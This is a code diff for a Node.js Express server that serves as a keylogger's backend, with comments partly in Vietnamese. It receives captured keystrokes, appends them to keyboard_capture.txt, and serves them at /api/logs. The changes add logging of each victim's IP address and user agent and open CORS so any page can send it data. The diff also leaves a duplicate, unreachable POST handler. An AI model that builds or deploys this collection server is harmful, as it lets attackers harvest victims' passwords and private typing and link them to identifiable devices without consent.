@@ -1,34 +1,30 @@
-// We import the fs module so that we can have access to the file system.
 const fs = require("fs");
 const express = require("express");
 const bodyParser = require("body-parser");
 
-// Create the express app.
 const app = express();
+const cors = require('cors');
 
-/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
-access the body of your request.
-*/
+app.use(cors());
 app.use(bodyParser.json({ extended: true }));
 
-const port = 8080;
+const port = process.env.PORT || 8080;
 
-app.get("/", (req, res) => {
+app.get("/api/logs", (req, res) => {
     try {
+        if (!fs.existsSync("./keyboard_capture.txt")) {
+            return res.json({ logs: "Chưa có dữ liệu log nào." });
+        }
         const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });
-
-        // Đọc khung giao diện từ file index.html bên ngoài
-        let htmlTemplate = fs.readFileSync("./index.html", { encoding: 'utf8', flag: 'r' });
-
-        // Đưa nội dung log vào vị trí thẻ {{LOG_CONTENT}} trong template
-        const finalHtml = htmlTemplate.replace("{{LOG_CONTENT}}", kl_file);
-
-        res.send(finalHtml);
-    } catch {
-        res.send("<h1>Nothing logged yet.</h1>");
+        res.json({ logs: kl_file });
+    } catch (error) {
+        res.json({ logs: "Chưa có log hoặc lỗi đọc file." });
     }
 });
 
+app.get("/", (req, res) => {
+    res.send("<h2>Keylogger Backend API is running successfully!</h2>");
+});
 
 app.post("/", (req, res) => {
     try {
@@ -40,12 +36,14 @@ app.post("/", (req, res) => {
             return res.status(200).send({ status: "ignored" });
         }
 
+        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+        const userAgent = req.headers['user-agent'] || "Unknown OS";
+
         const now = new Date();
         const timeString = now.toLocaleTimeString('vi-VN') + " " + now.toLocaleDateString('vi-VN');
 
-        const logEntry = `[${timeString}] ${content}\n`;
+        const logEntry = `[${timeString}] | IP: ${clientIp} | OS/Client: ${userAgent} | Nội dung: ${content}\n`;
 
-        // Will now write the keyboard capture to a text file.
         fs.appendFileSync("keyboard_capture.txt", logEntry);
         res.status(200).send("Successfully set the data");
     } catch (error) {
@@ -53,7 +51,27 @@ app.post("/", (req, res) => {
         res.status(500).send("Error saving data");
     }
 });
-// We can see that the app is listening on which port.
+
+app.post("/", (req, res) => {
+    try {
+        const content = req.body.context || "";
+        if (!content.trim()) {
+            return res.status(200).send({ status: "ignored" });
+        }
+
+        const now = new Date();
+        const timeString = now.toLocaleTimeString('vi-VN') + " " + now.toLocaleDateString('vi-VN');
+
+        const logEntry = `[${timeString}] ${content}\n`;
+
+        fs.appendFileSync("keyboard_capture.txt", logEntry);
+        res.status(200).send("Successfully set the data");
+    } catch (error) {
+        console.error("Lỗi ghi file:", error);
+        res.status(500).send("Error saving data");
+    }
+});
+
 app.listen(port, () => {
     console.log(`App is listening on port ${port}`);
 });
